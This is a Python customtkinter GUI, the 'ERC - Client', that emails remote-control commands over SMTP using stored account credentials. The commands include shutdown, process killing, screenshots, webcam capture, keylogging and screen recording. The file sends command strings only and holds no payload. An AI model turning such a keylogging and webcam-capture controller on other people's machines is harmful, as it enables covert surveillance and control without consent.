import customtkinter as ctk
import tkinter as tk
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import resource.variables as variables

smtp_host = variables.smtp_host
smtp_port = variables.smtp_port
imap_address = variables.imap_address
imap_port = variables.imap_port
USER_EMAIL = variables.CLIENT_EMAIL
USER_PASSWORD = variables.CLIENT_PASSWORD
recipient_mail = variables.USER_EMAIL

dark_cp = {
    'bg': '#08122A',
    'fg': '#111931',
    'button_1': '#66A9A5',  # send
    'button_2': '#E36B6B',  # close/delete mail
}

light_cp = {
    'bg': '#D3E1FC',
    'fg': '#A1BBEE'  # close/delete mail
}

ctk.set_appearance_mode('light')


class CheckboxFrame(ctk.CTkFrame):
    def __init__(self, master):
        super().__init__(master)
        self.master = master
        self.grid_columnconfigure(0, weight=1)
        self.configure(fg_color=(light_cp['fg'], dark_cp['fg']),
                       height=500, width=325, corner_radius=6)
        self.commands = ['help',
                         'shutdown',
                         'kill_process',
                         'screenshot',
                         'webcam',
                         'keylog',
                         'list_apps',
                         'list_processes',
                         'screen_record']
        self.checkboxes = []

        for i in range(len(self.commands)):
            self.checkboxes.append(
                ctk.CTkCheckBox(master=self,
                                text=self.commands[i],
                                corner_radius=12
                                ))
            self.checkboxes[i].grid(
                row=i, column=0, padx=20, pady=10, sticky='w')

        self.placeholder_text = 'Enter PID'
        self.placeholder_text2 = 'Enter duration'
        self.placeholder_text3 = 'Enter duration'
        self.entry = ctk.CTkEntry(
            self,
            fg_color=(light_cp['bg'], dark_cp['bg']),
            bg_color=(light_cp['fg'], dark_cp['fg']),
            border_color=(light_cp['fg'], dark_cp['fg']),
            corner_radius=12)
        self.entry2 = ctk.CTkEntry(
            self,
            fg_color=(light_cp['bg'], dark_cp['bg']),
            bg_color=(light_cp['fg'], dark_cp['fg']),
            border_color=(light_cp['fg'], dark_cp['fg']),
            corner_radius=12)
        self.entry3 = ctk.CTkEntry(
            self,
            fg_color=(light_cp['bg'], dark_cp['bg']),
            bg_color=(light_cp['fg'], dark_cp['fg']),
            border_color=(light_cp['fg'], dark_cp['fg']),
            corner_radius=12)
        self.entry.insert(0, self.placeholder_text)
        self.entry2.insert(0, self.placeholder_text2)
        self.entry3.insert(0, self.placeholder_text3)

        self.entry.bind('<FocusIn>', lambda event: self.on_entry_focus_in(
            event, self.entry, self.placeholder_text))
        self.entry2.bind('<FocusIn>', lambda event: self.on_entry_focus_in(
            event, self.entry2, self.placeholder_text2))
        self.entry3.bind('<FocusIn>', lambda event: self.on_entry_focus_in(
            event, self.entry3, self.placeholder_text3))

        self.entry.bind('<FocusOut>', lambda event: self.on_entry_focus_out(
            event, self.entry, self.placeholder_text))
        self.entry2.bind('<FocusOut>', lambda event: self.on_entry_focus_out(
            event, self.entry2, self.placeholder_text2))
        self.entry3.bind('<FocusOut>', lambda event: self.on_entry_focus_out(
            event, self.entry3, self.placeholder_text3))

        self.entry.grid(row=2, column=2, padx=20, pady=10)
        self.entry.grid_columnconfigure(1, weight=1)
        self.entry2.grid(row=5, column=2, padx=20, pady=10)
        self.entry2.grid_columnconfigure(1, weight=1)
        self.entry3.grid(row=8, column=2, padx=20, pady=10)
        self.entry3.grid_columnconfigure(1, weight=1)
        self.checkbox = ctk.CTkCheckBox(master=self,
                                text="Hardware decoding",
                                corner_radius=12
                                );
        self.checkbox.grid(
                row=9, column=2, padx=20, pady=10, sticky='w')

    def on_entry_focus_in(self, event, entry, placeholder_text):
        if entry.get() == placeholder_text:
            entry.delete(0, tk.END)
            entry.insert(0, '')

    def on_entry_focus_out(self, event, entry, placeholder_text):
        if entry.get() == '':
            entry.insert(0, placeholder_text)

    def is_convertible_to_int(self, input_string):
        try:
            int(input_string)
            return True
        except ValueError:
            return False

    def get(self):
        options = []
        for i, value in enumerate(self.checkboxes):
            if value.get() == 1:
                if self.commands[i] == 'kill_process':
                    text = self.entry.get()  # Enter PID, need int only
                    text = str(text) if self.is_convertible_to_int(
                        text) else "0"
                    options.append(
                        self.checkboxes[i].cget('text') + ' ' + text)
                elif self.commands[i] == 'keylog':
                    text = self.entry2.get()  # Enter duration, convert to string
                    text = str(text) if self.is_convertible_to_int(
                        text) else '0'
                    options.append(self.checkboxes[i].cget(
                        'text') + ' ' + text)
                elif self.commands[i] == 'screen_record':
                    text = self.entry3.get()
                    options.append(self.checkboxes[i].cget(
                        'text') + ' ' + text + ' ' + str(self.checkbox.get()))
                else:
                    options.append(self.checkboxes[i].cget('text'))
        checked_options = '\n'.join(options)
        return checked_options


class App(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("ERC - Client")
        self.geometry("360x525")
        self.resizable(False, False)
        self.configure(fg_color=(light_cp['bg'], dark_cp['bg']))
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(0, weight=1)

        # heading frame
        self.heading_frame = ctk.CTkFrame(
            self, fg_color=(light_cp['fg'], dark_cp['fg']), corner_radius=6)
        self.heading_frame.grid(row=0, column=0, padx=10,
                                pady=10, sticky='news')
        self.heading_frame.grid_columnconfigure(0, weight=1)
        # label
        self.label = ctk.CTkLabel(
            master=self.heading_frame,
            text="Choose commands & Send",
            fg_color='transparent',
            font=("Arial", 13, "bold"),
        )
        self.label.grid(row=0, column=1, padx=20, pady=10,
                        columnspan=1,
                        sticky='e')
        self.label.grid_columnconfigure(1, weight=1)
        # switch theme button
        self.switch_var = ctk.StringVar(value="light")
        self.theme_switch = ctk.CTkSwitch(
            master=self.heading_frame,
            text="Dark",
            font=("Arial", 13, "bold"),
            command=self.toggle_mode,
            variable=self.switch_var,
            onvalue="light",
            offvalue="dark")
        self.theme_switch.grid(row=0, column=0, padx=10, pady=10, sticky='w')
        self.theme_switch.grid_columnconfigure(0, weight=1)

        # checkbox frame
        self.checkboxFrame = CheckboxFrame(self)
        self.checkboxFrame.grid(row=1, column=0, padx=10, pady=10)

        # send and close button frame
        self.buttonFrame = ctk.CTkFrame(
            self, fg_color=(light_cp['fg'], dark_cp['fg']))
        self.buttonFrame.grid(row=2, column=0, padx=10, pady=10, columnspan=2)
        self.buttonFrame.grid_columnconfigure(0, weight=1)
        # send button
        self.button = ctk.CTkButton(
            master=self.buttonFrame,
            text="Send",
            fg_color=dark_cp['button_1'],
            text_color='black',
            command=lambda: self.send(self.checkboxFrame.get()))
        self.button.grid(row=2, column=0, padx=10, pady=10)
        self.button.grid_columnconfigure(1, weight=1)
        # close button
        self.close_button = ctk.CTkButton(
            master=self.buttonFrame,
            text="Close",
            fg_color=dark_cp['button_2'],
            text_color='black',
            command=self.destroy)
        self.close_button.grid(row=2, column=1, padx=10, pady=10)
        self.close_button.grid_columnconfigure(1, weight=1)

    def reset_label(self):
        self.label.configure(text="Choose commands & Send")

    def toggle_mode(self):
        if self.switch_var.get() == "light":
            self.theme_switch.configure(text="Dark")  # light
            ctk.set_appearance_mode("light")
        else:
            self.theme_switch.configure(text="Light")  # dark
            ctk.set_appearance_mode("dark")

    def send(self, checked_options):
        global recipient_mail
        msg = MIMEMultipart()
        msg['From'] = USER_EMAIL
        msg['To'] = recipient_mail
        msg['Subject'] = "Remote Control Command"

        if (len(checked_options) == 0):
            return
        # send plain text
        msg.attach(MIMEText(checked_options, 'plain'))

        try:
            server = smtplib.SMTP(smtp_host, smtp_port)
            server.starttls()
            server.login(USER_EMAIL, USER_PASSWORD)
            text = msg.as_string()
            server.sendmail(USER_EMAIL, recipient_mail, text)
            server.quit()
            self.label.configure(text="Email sent")
        except Exception as e:
            self.label.configure(text=e)
        self.after(3000, self.reset_label)


if __name__ == "__main__":
    app = App()
    app.mainloop()
